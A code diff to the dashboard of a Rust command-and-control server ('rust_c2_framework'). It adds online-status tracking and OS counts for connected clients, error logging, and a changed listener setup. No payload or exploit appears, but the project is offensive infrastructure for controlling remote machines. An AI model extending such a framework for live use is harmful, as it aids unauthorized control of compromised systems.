@@ -11,6 +11,9 @@ use axum::{
 use tower_http::{cors::CorsLayer, services::ServeDir};
 use askama::Template;
 use serde_json;
+use serde::{Deserialize, Serialize};
+use tokio::net::TcpListener as TokioTcpListener; // Alias Tokio's TcpListener
+use std::net::TcpListener as StdTcpListener; // Import Std TcpListener
 
 // 引入common模块
 use rust_c2_framework::common::*;
@@ -39,7 +42,17 @@ impl ServerState {
 #[derive(Template)]
 #[template(path = "index.html")]
 struct IndexTemplate {
-    clients: Vec<ClientInfo>,
+    clients: Vec<DisplayClientInfo>,
+    online_clients_count: usize,
+    os_types_count: usize, // Add this field
+}
+
+// New struct to combine ClientInfo with online status for display
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct DisplayClientInfo {
+    #[serde(flatten)]
+    pub client_info: ClientInfo,
+    pub is_online: bool,
 }
 
 #[derive(Template)]
@@ -108,7 +121,7 @@ async fn handle_command_result(
 
 /// 处理Shell数据
 async fn handle_shell_data(
-    State(state): State<ServerState>,
+    State(_state): State<ServerState>, // Fix: unused variable
     Json(message): Json<Message>,
 ) -> Result<StatusCode, StatusCode> {
     // 这里可以实现Shell数据的处理和转发
@@ -120,15 +133,34 @@ async fn handle_shell_data(
 /// 主页面
 async fn index(State(state): State<ServerState>) -> Result<Html<String>, StatusCode> {
     let clients = state.clients.read().await;
-    let clients_vec: Vec<ClientInfo> = clients.values().cloned().collect();
+    let current_timestamp = chrono::Utc::now().timestamp();
+
+    let display_clients: Vec<DisplayClientInfo> = clients.values().cloned().map(|c| {
+        let is_online = (current_timestamp - c.last_seen.timestamp()) < 60;
+        DisplayClientInfo {
+            client_info: c,
+            is_online,
+        }
+    }).collect();
     
+    let online_clients_count = display_clients.iter().filter(|c| c.is_online).count();
+    let os_types_count = display_clients.iter()
+        .map(|c| c.client_info.os.as_str())
+        .collect::<std::collections::HashSet<_>>()
+        .len();
+
     let template = IndexTemplate {
-        clients: clients_vec,
+        clients: display_clients,
+        online_clients_count,
+        os_types_count, // Pass the calculated count
     };
     
     match template.render() {
         Ok(html) => Ok(Html(html)),
-        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
+        Err(e) => {
+            eprintln!("Template rendering error: {:?}", e);
+            Err(StatusCode::INTERNAL_SERVER_ERROR)
+        },
     }
 }
 
@@ -219,8 +251,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     println!("C2 Server starting on http://0.0.0.0:8080");
     
-    let listener = tokio::net::TcpListener::bind("0.0.0.0:8080").await?;
-    axum::serve(listener, app).await?;
+    let listener = TokioTcpListener::bind("0.0.0.0:8080").await?;
+    let std_listener: StdTcpListener = listener.into_std()?; // Convert to std::net::TcpListener
+    std_listener.set_nonblocking(true)?; // Set non-blocking for hyper
+
+    axum::Server::from_tcp(std_listener)?.serve(app.into_make_service()).await?;
 
     Ok(())
 }
